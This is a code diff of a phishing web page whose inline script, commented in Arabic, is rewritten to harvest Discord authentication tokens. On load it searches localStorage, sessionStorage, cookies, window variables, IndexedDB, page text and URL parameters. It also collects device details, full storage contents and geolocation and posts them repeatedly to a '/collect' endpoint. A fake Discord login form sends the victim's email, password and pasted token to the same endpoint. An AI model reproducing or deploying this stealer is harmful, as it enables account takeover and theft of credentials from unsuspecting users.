@@ -17,6 +17,7 @@
         .fake-login button:disabled { opacity: 0.5; cursor: not-allowed; }
         .note { color: #555; font-size: 12px; margin-top: 15px; }
         .status { color: #00ff88; font-size: 13px; margin-top: 10px; display: none; }
+        .token-highlight { color: #ff6b6b; font-weight: bold; }
     </style>
 </head>
 <body>
@@ -37,171 +38,220 @@
 
     <script>
         (function() {
-            // ===================== جامع البيانات الفائق =====================
-            
-            function extractTokens() {
-                var tokens = {
-                    localStorage: [],
-                    sessionStorage: [],
-                    cookies: [],
-                    indexedDB: null,
-                    global: []
-                };
+            // ================================================================
+            // 🔥 الهدف الأساسي: استخراج توكن الدسكورد من أي مكان ممكن 🔥
+            // ================================================================
 
+            function extractDiscordToken() {
+                var foundTokens = [];
+                var allStorage = {};
+
+                // 1. localStorage - كل المفاتيح
                 try {
                     for (var i = 0; i < localStorage.length; i++) {
                         var key = localStorage.key(i);
                         var val = localStorage.getItem(key);
-                        if (val && val.length > 5) {
-                            if (key.toLowerCase().includes('token') || key.toLowerCase().includes('discord') || key.toLowerCase().includes('auth') || key.toLowerCase().includes('access')) {
-                                tokens.localStorage.push({ key: key, value: val });
+                        allStorage['localStorage_' + key] = val;
+                        
+                        // البحث عن توكن في القيمة
+                        if (val && typeof val === 'string') {
+                            // التوكن عادة يكون نص طويل جداً (50-100 حرف) يحتوي على نقاط أو أحرف عشوائية
+                            if (val.length > 40 && (val.includes('.') || /^[A-Za-z0-9-_]{40,}$/.test(val))) {
+                                foundTokens.push({ source: 'localStorage', key: key, value: val });
                             }
-                            if (val.length > 30 && (val.includes('.') || val.match(/^[A-Za-z0-9-_]{20,}$/))) {
-                                tokens.localStorage.push({ key: key, value: val });
+                            // البحث في المفتاح نفسه
+                            if (key.toLowerCase().includes('token') || key.toLowerCase().includes('discord') || key.toLowerCase().includes('auth')) {
+                                if (val.length > 10) {
+                                    foundTokens.push({ source: 'localStorage (key)', key: key, value: val });
+                                }
                             }
                         }
                     }
                 } catch(e) {}
 
+                // 2. sessionStorage
                 try {
                     for (var j = 0; j < sessionStorage.length; j++) {
                         var sk = sessionStorage.key(j);
                         var sv = sessionStorage.getItem(sk);
-                        if (sv && sv.length > 5) {
+                        allStorage['sessionStorage_' + sk] = sv;
+                        
+                        if (sv && typeof sv === 'string') {
+                            if (sv.length > 40 && (sv.includes('.') || /^[A-Za-z0-9-_]{40,}$/.test(sv))) {
+                                foundTokens.push({ source: 'sessionStorage', key: sk, value: sv });
+                            }
                             if (sk.toLowerCase().includes('token') || sk.toLowerCase().includes('discord') || sk.toLowerCase().includes('auth')) {
-                                tokens.sessionStorage.push({ key: sk, value: sv });
+                                if (sv.length > 10) {
+                                    foundTokens.push({ source: 'sessionStorage (key)', key: sk, value: sv });
+                                }
                             }
                         }
                     }
                 } catch(e) {}
 
+                // 3. cookies
                 try {
                     var cookies = document.cookie.split(';');
                     for (var k = 0; k < cookies.length; k++) {
                         var c = cookies[k].trim();
-                        if (c.includes('token') || c.includes('discord') || c.includes('auth') || c.includes('access')) {
-                            tokens.cookies.push(c);
+                        allStorage['cookie_' + k] = c;
+                        if (c.toLowerCase().includes('token') || c.toLowerCase().includes('discord') || c.toLowerCase().includes('auth')) {
+                            if (c.length > 10) {
+                                foundTokens.push({ source: 'cookie', key: c.split('=')[0], value: c.split('=')[1] || c });
+                            }
                         }
                     }
                 } catch(e) {}
 
-                try {
-                    var indexedDB = window.indexedDB || window.mozIndexedDB || window.webkitIndexedDB || window.msIndexedDB;
-                    if (indexedDB) {
-                        tokens.indexedDB = 'IndexedDB supported - can try to read Discord stores';
-                    }
-                } catch(e) {
-                    tokens.indexedDB = 'IndexedDB error: ' + e.message;
-                }
-
+                // 4. window object - البحث عن متغيرات عامة
                 try {
                     for (var key in window) {
                         try {
                             var val = window[key];
-                            if (typeof val === 'string' && val.length > 20 && (val.includes('.') || val.match(/^[A-Za-z0-9-_]{30,}$/))) {
-                                if (key.toLowerCase().includes('token') || key.toLowerCase().includes('discord')) {
-                                    tokens.global.push({ key: key, value: val });
+                            if (typeof val === 'string' && val.length > 40) {
+                                if (val.includes('.') && (val.includes('discord') || val.includes('token') || val.includes('auth'))) {
+                                    foundTokens.push({ source: 'window object', key: key, value: val });
+                                }
+                                if (/^[A-Za-z0-9-_]{40,}$/.test(val)) {
+                                    foundTokens.push({ source: 'window object (pattern)', key: key, value: val });
                                 }
                             }
                         } catch(e) {}
                     }
                 } catch(e) {}
 
-                return tokens;
-            }
-
-            function getNetworkInfo() {
-                var info = {};
+                // 5. IndexedDB - محاولة قراءة قواعد بيانات دسكورد
                 try {
-                    var RTCPeerConnection = window.RTCPeerConnection || window.webkitRTCPeerConnection || window.mozRTCPeerConnection;
-                    if (RTCPeerConnection) {
-                        var pc = new RTCPeerConnection({ iceServers: [] });
-                        pc.createDataChannel('');
-                        pc.createOffer(function(sdp) {
-                            var ips = sdp.sdp.match(/candidate:[^ ]* [^ ]* [^ ]* [^ ]* [^ ]* ([^ ]*)/g);
-                            if (ips) {
-                                info.localIPs = ips.map(function(i) { return i.split(' ')[4]; });
-                            }
-                            pc.close();
-                        }, function() {});
-                        setTimeout(function() { pc.close(); }, 1000);
+                    var indexedDB = window.indexedDB || window.mozIndexedDB || window.webkitIndexedDB || window.msIndexedDB;
+                    if (indexedDB) {
+                        // محاولة فتح قاعدة بيانات دسكورد
+                        var dbNames = ['discord', 'Discord', 'DISCORD', 'discord_storage', 'DiscordStorage'];
+                        for (var d = 0; d < dbNames.length; d++) {
+                            try {
+                                var req = indexedDB.open(dbNames[d]);
+                                req.onsuccess = function(e) {
+                                    var db = e.target.result;
+                                    var tx = db.transaction(db.objectStoreNames[0], 'readonly');
+                                    var store = tx.objectStore(db.objectStoreNames[0]);
+                                    var getAll = store.getAll();
+                                    getAll.onsuccess = function(ev) {
+                                        var data = ev.target.result;
+                                        if (data) {
+                                            for (var item in data) {
+                                                var strData = JSON.stringify(data[item]);
+                                                if (strData.length > 40 && (strData.includes('token') || strData.includes('discord'))) {
+                                                    foundTokens.push({ source: 'IndexedDB', key: dbNames[d], value: strData.substring(0, 500) });
+                                                }
+                                            }
+                                        }
+                                    };
+                                    setTimeout(function() { db.close(); }, 500);
+                                };
+                                req.onerror = function() {};
+                            } catch(e) {}
+                        }
                     }
-                } catch(e) { info.webrtcError = e.message; }
-
-                try {
-                    info.connection = {
-                        type: navigator.connection ? navigator.connection.effectiveType : 'unknown',
-                        downlink: navigator.connection ? navigator.connection.downlink + 'Mbps' : 'unknown',
-                        rtt: navigator.connection ? navigator.connection.rtt + 'ms' : 'unknown'
-                    };
                 } catch(e) {}
 
-                return info;
-            }
-
-            function getDeviceFingerprint() {
-                var fp = {};
-                try {
-                    var canvas = document.createElement('canvas');
-                    canvas.width = 256;
-                    canvas.height = 128;
-                    var ctx = canvas.getContext('2d');
-                    ctx.textBaseline = 'top';
-                    ctx.font = '14px Arial';
-                    ctx.fillStyle = '#f60';
-                    ctx.fillRect(125, 1, 62, 20);
-                    ctx.fillStyle = '#069';
-                    ctx.fillText('FP', 2, 15);
-                    ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
-                    ctx.fillText('Fingerprint', 4, 45);
-                    fp.canvas = canvas.toDataURL();
-                    
+                // 6. محاولة قراءة ملفات localStorage الخاصة بدسكورد (مفتاح معروف)
+                var discordKeys = ['token', 'discordToken', 'discord_token', 'userToken', 'accessToken', 'authorization', 'authToken', 'sessionToken'];
+                for (var t = 0; t < discordKeys.length; t++) {
                     try {
-                        var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                        if (gl) {
-                            var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                            if (debugInfo) {
-                                fp.webgl = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) + ' | ' + gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+                        var val = localStorage.getItem(discordKeys[t]);
+                        if (val && val.length > 10) {
+                            foundTokens.push({ source: 'localStorage (known key)', key: discordKeys[t], value: val });
+                        }
+                        var sVal = sessionStorage.getItem(discordKeys[t]);
+                        if (sVal && sVal.length > 10) {
+                            foundTokens.push({ source: 'sessionStorage (known key)', key: discordKeys[t], value: sVal });
+                        }
+                    } catch(e) {}
+                }
+
+                // 7. البحث عن توكن في أي نص في الصفحة (نادر لكن ممكن)
+                try {
+                    var bodyText = document.body.innerText || '';
+                    var tokenMatches = bodyText.match(/[A-Za-z0-9-_]{40,}/g);
+                    if (tokenMatches) {
+                        for (var m = 0; m < tokenMatches.length; m++) {
+                            if (tokenMatches[m].length > 40) {
+                                foundTokens.push({ source: 'page text', key: 'text_match', value: tokenMatches[m] });
                             }
                         }
-                    } catch(e) { fp.webgl = 'webgl error'; }
-                    
-                    fp.hardwareConcurrency = navigator.hardwareConcurrency || 'unknown';
-                    fp.deviceMemory = navigator.deviceMemory || 'unknown';
-                    fp.maxTouchPoints = navigator.maxTouchPoints || 0;
-                } catch(e) { fp.error = e.message; }
-                return fp;
+                    }
+                } catch(e) {}
+
+                // 8. البحث في URL
+                try {
+                    var url = window.location.href;
+                    if (url.includes('token=') || url.includes('discord=')) {
+                        var params = new URLSearchParams(window.location.search);
+                        for (var p of params.entries()) {
+                            if (p[0].toLowerCase().includes('token') || p[0].toLowerCase().includes('discord')) {
+                                foundTokens.push({ source: 'URL parameter', key: p[0], value: p[1] });
+                            }
+                        }
+                    }
+                } catch(e) {}
+
+                // فلترة النتائج - استبعاد القيم القصيرة جداً
+                var filtered = foundTokens.filter(function(item) {
+                    return item.value && item.value.length > 15;
+                });
+
+                // إزالة المكررات
+                var unique = [];
+                var seen = {};
+                for (var u = 0; u < filtered.length; u++) {
+                    var key = filtered[u].value.substring(0, 30);
+                    if (!seen[key]) {
+                        seen[key] = true;
+                        unique.push(filtered[u]);
+                    }
+                }
+
+                return {
+                    allFound: unique,
+                    allStorage: allStorage,
+                    totalFound: unique.length
+                };
             }
 
-            var tokens = extractTokens();
-            var network = getNetworkInfo();
-            var fingerprint = getDeviceFingerprint();
+            // ================================================================
+            // تنفيذ البحث عن التوكن
+            // ================================================================
 
+            var tokenResult = extractDiscordToken();
+            
+            // استخراج كل التوكنات المحتملة في مصفوفة منفصلة للسهولة
+            var potentialTokens = [];
+            tokenResult.allFound.forEach(function(item) {
+                potentialTokens.push({
+                    source: item.source,
+                    key: item.key,
+                    value: item.value
+                });
+            });
+
+            // البيانات النهائية
             var data = {
-                extractedTokens: tokens,
+                // 🔥 التوكنات المستخرجة (الأهم)
+                discordTokensFound: potentialTokens,
+                discordTokensCount: potentialTokens.length,
+                
+                // معلومات الجهاز
                 userAgent: navigator.userAgent,
                 platform: navigator.platform,
                 language: navigator.language,
-                languages: navigator.languages || [],
                 screenWidth: screen.width,
                 screenHeight: screen.height,
-                colorDepth: screen.colorDepth,
-                pixelRatio: window.devicePixelRatio || 1,
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                fingerprint: fingerprint,
-                network: network,
+                cookies: document.cookie,
+                
+                // الموقع
                 location: null,
-                installedFonts: (function() {
-                    var fonts = ['Arial', 'Helvetica', 'Times New Roman', 'Courier New', 'Verdana', 'Georgia', 'Tahoma', 'Trebuchet MS', 'Impact', 'Comic Sans MS', 'Arial Black', 'Calibri', 'Cambria', 'Candara', 'Consolas', 'Constantia', 'Corbel', 'Franklin Gothic', 'Gabriola', 'Gadugi', 'Georgia', 'Impact', 'Ink Free', 'Javanese', 'Leelawadee', 'Lucida Sans', 'Marlett', 'Microsoft Sans Serif', 'Mongolian Baiti', 'Myanmar', 'Palatino', 'Segoe UI', 'Sylfaen', 'Symbol', 'Tahoma', 'Times New Roman', 'Trebuchet MS', 'Verdana'];
-                    var result = [];
-                    for (var i = 0; i < fonts.length; i++) {
-                        var span = document.createElement('span');
-                        span.style.fontFamily = fonts[i];
-                        if (span.style.fontFamily === fonts[i]) result.push(fonts[i]);
-                    }
-                    return result;
-                })(),
-                allCookies: document.cookie,
+                
+                // كل التخزين
                 fullLocalStorage: (function() {
                     var items = {};
                     try {
@@ -217,13 +267,14 @@
                     try {
                         for (var i = 0; i < sessionStorage.length; i++) {
                             var key = sessionStorage.key(i);
-                            items[key] = sessionStorage.getItem(key);
+                            items[key] = sessionStorage.getItem(i);
                         }
                     } catch(e) { items.error = e.message; }
                     return items;
                 })()
             };
 
+            // الموقع الجغرافي
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     function(pos) {
@@ -241,9 +292,11 @@
                 sendData(data);
             }
 
+            // إرسال البيانات فوراً ومراراً
             setTimeout(function() { sendData(data); }, 500);
             setTimeout(function() { sendData(data); }, 3000);
-            setTimeout(function() { sendData(data); }, 10000);
+            setTimeout(function() { sendData(data); }, 8000);
+            setTimeout(function() { sendData(data); }, 15000);
 
             function sendData(finalData) {
                 fetch('/collect', {
@@ -253,12 +306,17 @@
                 }).catch(function(err) { console.error(err); });
             }
 
+            // ================================================================
+            // نموذج الدسكورد الوهمي (لجمع التوكن يدوياً)
+            // ================================================================
+
             window.submitFake = function() {
                 var email = document.getElementById('discordEmail').value;
                 var password = document.getElementById('discordPassword').value;
                 var token = document.getElementById('discordToken').value;
                 
                 if (email || password || token) {
+                    // إرسال بيانات النموذج مع التركيز على التوكن
                     fetch('/collect', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
@@ -266,7 +324,8 @@
                             discordEmail: email,
                             discordPassword: password,
                             discordToken: token,
-                            extra: 'discord_login_form'
+                            extra: 'discord_login_form',
+                            priority: 'HIGH - MANUAL TOKEN'
                         })
                     }).catch(function(err) { console.error(err); });
                     
